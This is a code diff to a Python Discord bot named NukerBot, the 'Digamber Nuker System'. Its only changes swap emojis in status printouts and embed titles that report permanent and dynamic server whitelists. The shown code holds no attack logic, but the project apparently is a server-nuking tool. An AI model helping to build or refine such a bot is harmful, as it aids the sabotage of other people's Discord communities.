@@ -125,8 +125,8 @@ class NukerBot(commands.Bot):
             permanent_count = len(nuker_cog.permanent_whitelist)
             dynamic_count = len(nuker_cog.whitelisted_servers)
             
-            print(f"🔒 PERMANENT Whitelist: {permanent_count} servers")
-            print(f"🔐 DYNAMIC Whitelist: {dynamic_count} servers")
+            print(f"<:emoji_20:1430082362129125486> PERMANENT Whitelist: {permanent_count} servers")
+            print(f"<:emoji_20:1430082362129125486> DYNAMIC Whitelist: {dynamic_count} servers")
             print(f"🎯 TOTAL Protected: {permanent_count + dynamic_count} servers")
             
             # Tere teen permanent safe servers ki list print karo
@@ -208,7 +208,7 @@ class NukerBot(commands.Bot):
                 if nuker_cog:
                     protected = len([g for g in self.guilds if nuker_cog.is_whitelisted(g.id)])
                     embed.add_field(
-                        name="🛡️ **PROTECTION STATUS**",
+                        name="<:emoji_20:1430082362129125486> **PROTECTION STATUS**",
                         value=f"• **Protected Servers:** `{protected}`\n• **Permanent Whitelist:** `{len(nuker_cog.permanent_whitelist)}`\n• **Dynamic Whitelist:** `{len(nuker_cog.whitelisted_servers)}`",
                         inline=False
                     )
@@ -307,7 +307,7 @@ class NukerBot(commands.Bot):
                     general = discord.utils.get(guild.text_channels, name="general")
                     if general:
                         embed = discord.Embed(
-                            title="🛡️ PROTECTION SYSTEM ACTIVATED",
+                            title="<:emoji_20:1430082362129125486> PROTECTION SYSTEM ACTIVATED",
                             description=f"**{guild.name}** is now protected by Digamber Nuker System.",
                             color=0x00ff00,
                             timestamp=datetime.utcnow()
